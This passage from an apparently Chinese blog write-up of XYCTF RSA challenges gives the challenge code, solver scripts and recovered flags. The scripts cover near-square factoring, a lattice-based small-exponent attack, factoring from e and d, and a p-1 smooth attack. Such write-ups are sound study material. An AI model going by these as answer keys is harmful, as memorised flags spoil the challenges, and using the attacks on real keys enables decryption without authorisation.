-250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mn" transform="translate(422,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g></g></g></svg></mjx-container> 开方，进而分解</p><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">n</span> = <span class="hljs-number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span><br><span class="hljs-attribute">c</span> = <span class="hljs-number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span><br><br><span class="hljs-attribute">r</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-attribute">x</span> = <span class="hljs-number">2</span>**<span class="hljs-number">512</span>  + r<br>    <span class="hljs-attribute">tmp</span> = x ** <span class="hljs-number">2</span> - <span class="hljs-number">4</span>*n<br>    <span class="hljs-attribute">y</span> = gmpy2.iroot(tmp,<span class="hljs-number">2</span>)<br>    <span class="hljs-attribute">if</span> y[<span class="hljs-number">1</span>]:<br>        <span class="hljs-attribute">p</span> = (x+y[<span class="hljs-number">0</span>]) // <span class="hljs-number">2</span><br>        <span class="hljs-attribute">q</span> = n // p<br>        <span class="hljs-attribute">d</span> = gmpy2.invert(<span class="hljs-number">65537</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>        <span class="hljs-attribute">m</span> = pow(c,d,n)<br>        <span class="hljs-attribute">print</span>(long_to_bytes(m))<br>        <span class="hljs-attribute">print</span>(r)             <br>        <span class="hljs-attribute">break</span><br>    <span class="hljs-attribute">else</span>:<br>        <span class="hljs-attribute">r</span> += <span class="hljs-number">1</span><br><span class="hljs-comment">#b'XYCTF{24611067-c60f-427c-aaab-d17e4b81e2ee}'</span><br></code></pre></td></tr></table></figure><h3 id="factor1"><a href="#factor1" class="headerlink" title="factor1"></a>factor1</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> gmpy2<br><span class="hljs-attribute">import</span> hashlib<br><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><br><span class="hljs-attribute">p</span> = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-attribute">q</span> = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-attribute">d</span> = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-attribute">e</span> = gmpy2.invert(d, (p**<span class="hljs-number">3</span> - <span class="hljs-number">1</span>) * (q**<span class="hljs-number">3</span> - <span class="hljs-number">1</span>))<br><span class="hljs-attribute">flag</span> = <span class="hljs-string">"XYCTF{"</span> + hashlib.md5(str(p + q).encode()).hexdigest() + <span class="hljs-string">"}"</span><br><span class="hljs-attribute">print</span>(e)<br><span class="hljs-attribute">print</span>(p * q)<br><span class="hljs-comment"># 172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163</span><br><span class="hljs-comment"># 99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793</span><br><br></code></pre></td></tr></table></figure><p>e过大，想到低解密指数攻击，同时得到两个函数，</p><script type="math/tex; mode=display">e * d = 1 \enspace mod \enspace (p^{3}-1)*(q^{3}-1)</script><script type="math/tex; mode=display">n = p * q</script><p>令n=<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.345ex" height="1.91ex" role="img" focusable="false" viewbox="0 -833.2 1036.6 844.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="TeXAtom" transform="translate(633,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"/></g></g></g></g></g></svg></mjx-container>  在格上构造 </p><script type="math/tex; mode=display">[D, n+1</script><script type="math/tex; mode=display">0, -e]</script><p>其中D =<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="9.894ex" height="2.021ex" role="img" focusable="false" viewbox="0 -893.3 4373.1 893.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(600,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/></g><g data-mml-node="mi" transform="translate(878,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(1478,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mi" transform="translate(1907,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(2252,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/></g><g data-mml-node="mi" transform="translate(2613,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/></g><g data-mml-node="mo" transform="translate(3082,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mo" transform="translate(3471,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3860,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(4360,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/></g></g><g data-mml-node="mn" transform="translate(4860,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g></g></g></g></svg></mjx-container></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#sagemath</span><br>e=172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163<br>n=99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793<br>n=n^3<br>from Crypto.Util.number import *<br>import random<br>from gmpy2 import *<br>D = 2^(n.nbits()//2)<br>m = matrix(ZZ, [<br>  [D, n+1],<br>  [0, -e]<br>])<br>L = m.LLL()<br>w = L[0]<br>v = m.solve_left(w)<br>k = abs(v[0])<br>d = abs(v[1])<br>print(k)<br>print(d)<br>k=1494016303704162064457264904035459059241052443477469129020991127731711502975536480528822831565100775167693515363479900721259984367515846296462994230670260<br>d=8447122254265361577759220083550460887840558233627984117576685838469227480934556534673167325385487344741530262745308367064419215281251764917289925433582347<br><br></code></pre></td></tr></table></figure><p>根据k,d即可求出p,q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><br>e=<span class="hljs-number">172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163</span><br>n=<span class="hljs-number">99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793</span><br>k=<span class="hljs-number">1494016303704162064457264904035459059241052443477469129020991127731711502975536480528822831565100775167693515363479900721259984367515846296462994230670260</span><br>d=<span class="hljs-number">8447122254265361577759220083550460887840558233627984117576685838469227480934556534673167325385487344741530262745308367064419215281251764917289925433582347</span><br><br>k = e * d - <span class="hljs-number">1</span><br><br>r = k<br>t = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = r // <span class="hljs-number">2</span><br>    t += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> r % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br><br>success = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">101</span>):<br>    g = random.randint(<span class="hljs-number">0</span>, n)<br>    y = <span class="hljs-built_in">pow</span>(g, r, n)<br>    <span class="hljs-keyword">if</span> y == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> y == n - <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t):<br>        x = <span class="hljs-built_in">pow</span>(y, <span class="hljs-number">2</span>, n)<br>        <span class="hljs-keyword">if</span> x == <span class="hljs-number">1</span>:<br>            success = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> x == n - <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            y = x<br><br>    <span class="hljs-keyword">if</span> success:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><br><span class="hljs-keyword">if</span> success:<br>    p = libnum.gcd(y - <span class="hljs-number">1</span>, n)<br>    q = n // p<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'p = '</span> + <span class="hljs-string">'%s'</span> % p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'q = '</span> + <span class="hljs-string">'%s'</span> % q)<br>    flag = <span class="hljs-string">"XYCTF{"</span> + hashlib.md5(<span class="hljs-built_in">str</span>(p + q).encode()).hexdigest() + <span class="hljs-string">"}"</span><br>    <span class="hljs-built_in">print</span>(flag)<br>    <span class="hljs-built_in">print</span>(n==p*q)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'Cannot compute P and Q'</span>)<br><span class="hljs-string">'''   </span><br><span class="hljs-string">p = 9212046353930376594996890089494718736894378991991381248242532319628627449681664076081705664941905594411935750003102856235503684466394327681725704255564467</span><br><span class="hljs-string">q = 10754959493573546439510276829300246769373124436128170955050379041986504869221750743052397622171703140881050431144683659643071578143360949942206693325622779</span><br><span class="hljs-string">XYCTF{a83211a70e18145a59671c08ddc67ba4}</span><br><span class="hljs-string">True</span><br><span class="hljs-string">'''</span><br></code></pre></td></tr></table></figure><p>这里用wiener也可以，只不过需要在多组k,d解出的p,q验证。应为d为512位，n^3有512 <em> 2 </em> 3位，delta=0.1666···，满足条件</p><h3 id="babyRSAMAX"><a href="#babyRSAMAX" class="headerlink" title="babyRSAMAX"></a>babyRSAMAX</h3><p>题目：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs 1c">from Crypto.Util.number import *<br>from gmpy2 import *<br>from random import choice<br><br>flag = b'XYCTF{******}'<br>e = '?'<br>def getBabyPrime(nbits):<br>    while True:<br>        p = <span class="hljs-number">1</span><br>        while p.bit_length() &lt;= nbits:<br>            p *= choice(sieve_base)<br>        <br>        if isPrime(p+<span class="hljs-number">1</span>):<br>            return p+<span class="hljs-number">1</span><br><br>p = getBabyPrime(<span class="hljs-number">512</span>)<br>q = getBabyPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>gift1 = (<span class="hljs-built_in">pow</span>(p,e,n)-<span class="hljs-built_in">pow</span>(q,e,n)) % n<br>gift2 = <span class="hljs-built_in">pow</span>(p+q,e,n)<br><br>t = <span class="hljs-number">65537</span><br>x = bytes_to_long(e)<br>y = <span class="hljs-built_in">pow</span>(x, t, n)<br><br>m = bytes_to_long(flag)<br>c = powmod(m, e, n)<br><br>print(f'n = {n}')<br>print(f'gift1 = {gift1}')<br>print(f'gift2 = {gift2}')<br>print(f'c = {c}')<br>print(f'y = {y}')<br><br>'''<br>n = <span class="hljs-number">39332423872740</span><span class="hljs-number">21078324606903</span><span class="hljs-number">08559462441049</span><span class="hljs-number">82381157166843</span><span class="hljs-number">97759978023391</span><span class="hljs-number">11831585609013</span><span class="hljs-number">77359925435092</span><span class="hljs-number">32665330396426</span><span class="hljs-number">15501586585515</span><span class="hljs-number">18626014048783</span><span class="hljs-number">43524547153695</span><span class="hljs-number">98448740365169</span><span class="hljs-number">31542444719549</span><span class="hljs-number">99797148264490</span><span class="hljs-number">55234594077753</span><span class="hljs-number">92702211086149</span><span class="hljs-number">27947378479620</span><span class="hljs-number">20202819097067</span><span class="hljs-number">23380472571862</span><span class="hljs-number">79200368742379</span><span class="hljs-number">15765300857477</span><span class="hljs-number">16706475220532</span>321<br>gift1 = <span class="hljs-number">45494024447463</span><span class="hljs-number">38327349007235</span><span class="hljs-number">81818779395028</span><span class="hljs-number">51050917261675</span><span class="hljs-number">73552412678416</span><span class="hljs-number">75969466016695</span><span class="hljs-number">67827556314472</span><span class="hljs-number">71662108564084</span><span class="hljs-number">38209856299995</span><span class="hljs-number">02287083009022</span><span class="hljs-number">01571583419116</span><span class="hljs-number">29993226447838</span><span class="hljs-number">11970344023384</span><span class="hljs-number">81872937576172</span><span class="hljs-number">19720251977078</span><span class="hljs-number">24583436060605</span><span class="hljs-number">44694608852844</span><span class="hljs-number">22840045723210</span><span class="hljs-number">09042170629140</span><span class="hljs-number">47342663534138</span><span class="hljs-number">66849032840002</span><span class="hljs-number">26518165973673</span>10<br>gift2 = <span class="hljs-number">11106121599895</span><span class="hljs-number">97099207364480</span><span class="hljs-number">50860427855012</span><span class="hljs-number">02681537667206</span><span class="hljs-number">76012440535805</span><span class="hljs-number">66359594802604</span><span class="hljs-number">25199298638218</span><span class="hljs-number">78910225832479</span><span class="hljs-number">97994146019970</span><span class="hljs-number">44524750911971</span><span class="hljs-number">94113107604919</span><span class="hljs-number">83876636264003</span><span class="hljs-number">94287075640232</span><span class="hljs-number">86340921467998</span><span class="hljs-number">25005835867245</span><span class="hljs-number">56342013525304</span><span class="hljs-number">82238983344600</span><span class="hljs-number">67523975023732</span><span class="hljs-number">15323079113687</span><span class="hljs-number">03243022591271</span><span class="hljs-number">59852763634051</span><span class="hljs-number">23881196916101</span><span class="hljs-number">1462</span><br>c = <span class="hljs-number">16938927825234</span><span class="hljs-number">40726702601756</span><span class="hljs-number">10454902656984</span><span class="hljs-number">91840814929432</span><span class="hljs-number">15283974503594</span><span class="hljs-number">61187437145666</span><span class="hljs-number">23315033802681</span><span class="hljs-number">00901769552637</span><span class="hljs-number">43973703439843</span><span class="hljs-number">60997903165842</span><span class="hljs-number">59141420319718</span><span class="hljs-number">49465884703557</span><span class="hljs-number">28984912522040</span><span class="hljs-number">74469197481963</span><span class="hljs-number">01181639762592</span><span class="hljs-number">46941579063687</span><span class="hljs-number">85799419330955</span><span class="hljs-number">41298162689316</span><span class="hljs-number">72391946592680</span><span class="hljs-number">57868127069358</span><span class="hljs-number">99110214657524</span><span class="hljs-number">54315629283033</span>043<br>y = <span class="hljs-number">18136500012709</span><span class="hljs-number">67709841306491</span><span class="hljs-number">29771690896942</span><span class="hljs-number">52488885109851</span><span class="hljs-number">09381881270362</span><span class="hljs-number">75503138556492</span><span class="hljs-number">78693131125405</span><span class="hljs-number">34780853966341</span><span class="hljs-number">04452685670558</span><span class="hljs-number">90202950484733</span><span class="hljs-number">05762088786992</span><span class="hljs-number">44635006002488</span><span class="hljs-number">11177410412603</span><span class="hljs-number">91405962817182</span><span class="hljs-number">67442171523919</span><span class="hljs-number">72112746684509</span><span class="hljs-number">47666394594121</span><span class="hljs-number">76433379413830</span><span class="hljs-number">84421241147448</span><span class="hljs-number">92164155894256</span><span class="hljs-number">32696160513747</span><span class="hljs-number">92860829645202</span>17<br><br>'''<br></code></pre></td></tr></table></figure><p>存在关系：</p><script type="math/tex; mode=display">gift1 = p^e -q^e \enspace mod\enspace n</script><script type="math/tex; mode=display">gift2 = (p+q)^e =p^e+q^e \enspace mod \enspace n</script><script type="math/tex; mode=display">y=e^{65537} \enspace mod \enspace n</script><script type="math/tex; mode=display">c=m^e \enspace mod \enspace n</script><p>分解p，q</p><script type="math/tex; mode=display">gift1+gift2=2*p^e \enspace mod \enspace n</script><script type="math/tex; mode=display">gift2-gift1=2*q^e \enspace mod \enspace n</script><script type="math/tex; mode=display">p=gcd(gift1+gift2,n)</script><script type="math/tex; mode=display">q=gcd(gift2-gift1,n)</script><p>方法2：可能是非预期，因为p,q的生成是</p><script type="math/tex; mode=display">p_1*p_2**p_n+1</script><p>可以用p-1光滑攻击</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 